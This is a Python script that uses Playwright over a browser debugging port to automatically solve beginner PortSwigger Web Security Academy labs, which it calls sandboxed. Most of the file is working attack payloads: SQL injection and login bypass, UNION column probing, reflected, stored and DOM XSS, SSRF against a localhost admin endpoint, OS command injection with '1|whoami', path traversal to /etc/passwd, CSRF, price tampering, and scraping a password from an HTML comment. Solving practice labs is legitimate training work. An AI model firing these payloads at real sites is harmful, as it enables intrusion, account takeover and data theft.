#!/usr/bin/env python3
"""psw_solve.py — knock out apprentice PortSwigger labs via the live Brave
session (CDP :9222). Each solver GETs the lab instance URL, fires the known
exploit through the browser context, then re-checks the academy lab page for
the 'solved' banner. Safe: labs are sandboxed targets built for this."""
import re, sys, time, urllib.parse
from playwright.sync_api import sync_playwright

ACAD = "https://portswigger.net"
UA = {"User-Agent": "Mozilla/5.0 bb-lab-lab-runner"}

def lab_url(page, path):
    """Return the *.web-security-academy.net instance URL for a lab page.
    The 'Launch lab' button is a launch/<hash> redirect — follow it and read
    the landing URL."""
    page.goto(ACAD + path)
    time.sleep(2.5)
    m = re.search(r'/academy/labs/launch/[0-9a-f]{32,}[^"\'< ]*', page.content())
    if not m: return None
    try:
        page.goto(ACAD + m.group(0).replace("&amp;", "&"),
                  wait_until="domcontentloaded", timeout=20000)
        time.sleep(2.5)
        if "web-security-academy.net" in page.url:
            return page.url.rstrip("/")
    except Exception:
        pass
    m2 = re.search(r'https://[0-9a-f]+\.web-security-academy\.net[^"\'< ]*',
                   page.content())
    return m2.group(0).rstrip("/") if m2 else None

def p_title(page):
    try: return page.title()
    except Exception: return ""

def get(page, url, **kw):
    r = page.request.get(url, **kw); return r

def post(page, url, data=None, form=None, **kw):
    return page.request.post(url, form=form or data, **kw)

def solved(page, path):
    page.goto(ACAD + path); time.sleep(2.5)
    html = page.content().lower()
    return "solved" in html and ("congrat" in html or "100%" in html or "check" in html)

def try_get_instance(page, path):
    u = lab_url(page, path)
    if u: return u.rstrip("/")
    return None

# ── solvers: each takes (page, base) → attempts exploit ─────────────────

def s_hidden(page, base):
    get(page, f"{base}/filter?category=Gifts'%20OR%201=1--")

def s_loginbypass(page, base):
    post(page, f"{base}/login", form={"username": "administrator'--", "password": "x"})

def s_xss_reflected(page, base):
    page.goto(f"{base}/?search=%3Cscript%3Ealert(1)%3C/script%3E"); time.sleep(1.5)

def s_xss_stored(page, base):
    post(page, f"{base}/post/comment", form={
        "csrf": "", "postId": "1", "comment": "<script>alert(1)</script>",
        "name": "bb", "email": "b@b.co", "website": ""})
    page.goto(f"{base}/post?postId=1"); time.sleep(1.5)

def s_xss_dom(page, base):
    page.goto(f'{base}/?search=%22%3E%3Csvg%20onload%3Dalert(1)%3E'); time.sleep(1.5)

def s_admin_panel(page, base):
    r = get(page, f"{base}/robots.txt")
    get(page, f"{base}/administrator-panel/delete?username=carlos")
    get(page, f"{base}/administrator-panel")

def s_ssrf(page, base):
    post(page, f"{base}/product/stock",
         form={"stockApi": "http://localhost/admin/delete?username=carlos"})

def s_cmdi(page, base):
    post(page, f"{base}/product/stock",
         form={"productId": "1", "storeId": "1|whoami"})

def s_pt(page, base):
    get(page, f"{base}/image?filename=../../../etc/passwd")

def s_logic(page, base):
    post(page, f"{base}/cart", form={
        "productId": "1", "redir": "cart", "quantity": "1", "price": "1"})
    post(page, f"{base}/cart/checkout", form={})

def s_csrf(page, base):
    post(page, f"{base}/login", form={"username": "wiener", "password": "peter"})
    post(page, f"{base}/my-account/change-email",
         form={"email": "bb@bb-lab.example"})

def s_info_error(page, base):
    get(page, f"{base}/product?productId='")

def s_info_source(page, base):
    # password sits in an HTML comment on the home page → login with it
    r = get(page, base + "/"); body = r.text()
    m = re.search(r'<!--\s*(?:password|debug)[^>]*?[:=]\s*([A-Za-z0-9]+)', body, re.I) \
        or re.search(r'password[^a-z0-9]*([a-z0-9]{6,})', body, re.I)
    if m:
        post(page, f"{base}/login",
             form={"username": "administrator", "password": m.group(1)})

def s_info_debug(page, base):
    get(page, f"{base}/cgi-bin/phpinfo.php")

def s_git(page, base):
    get(page, f"{base}/.git")
    get(page, f"{base}/.git/HEAD")

def s_backup(page, base):
    get(page, f"{base}/robots.txt")
    get(page, f"{base}/backup")
    get(page, f"{base}/backup/product.bak")

def s_abs(page, base):
    get(page, f"{base}/image?filename=/etc/passwd")

def s_union_cols(page, base):
    for n in range(1, 6):
        nulls = ",".join(["NULL"] * n)
        r = get(page, f"{base}/filter?category=Gifts'%20UNION%20SELECT%20{nulls}--")
        if r.status == 200 and n > 1: break

def s_open_redirect(page, base):
    get(page, f"{base}/post?postId=4&url=https://exploit.invalid")

LABS = [
    ("/web-security/sql-injection/lab-retrieve-hidden-data", s_hidden),
    ("/web-security/sql-injection/lab-login-bypass", s_loginbypass),
    ("/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded", s_xss_reflected),
    ("/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded", s_xss_stored),
    ("/web-security/cross-site-scripting/dom-based/lab-document-write-sink", s_xss_dom),
    ("/web-security/access-control/lab-unprotected-admin-panel", s_admin_panel),
    ("/web-security/ssrf/lab-basic-ssrf-against-localhost", s_ssrf),
    ("/web-security/os-command-injection/lab-simple", s_cmdi),
    ("/web-security/file-path-traversal/lab-simple", s_pt),
    ("/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls", s_logic),
    ("/web-security/csrf/lab-no-defenses", s_csrf),
    ("/web-security/information-disclosure/exploiting/lab-infoleak-in-error-messages", s_info_error),
    ("/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history", s_git),
    ("/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page", s_info_debug),
    ("/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files", s_backup),
    ("/web-security/file-path-traversal/lab-absolute-path-bypass", s_abs),
    ("/web-security/sql-injection/union-attacks/lab-determine-number-of-columns", s_union_cols),
]

def main():
    pw = sync_playwright().start()
    b = pw.chromium.connect_over_cdp("http://localhost:9222")
    page = b.contexts[0].new_page()
    page.on("dialog", lambda d: d.accept())
    results = []
    for path, fn in LABS:
        if fn is None: continue
        try:
            try: page.content()
            except Exception:
                page = b.contexts[0].new_page()
                page.on("dialog", lambda d: d.accept())
            base = try_get_instance(page, path)
            if not base:
                results.append((path.split('/')[-1], "NO-INSTANCE")); continue
            fn(page, base)
            ok = solved(page, path)
            results.append((path.split('/')[-1], "SOLVED" if ok else "attempted"))
        except Exception as e:
            results.append((path.split('/')[-1], f"ERR {e}"))
    for n, s in results: print(f"{s:<12} {n}")
    pw.stop()

if __name__ == "__main__":
    main()
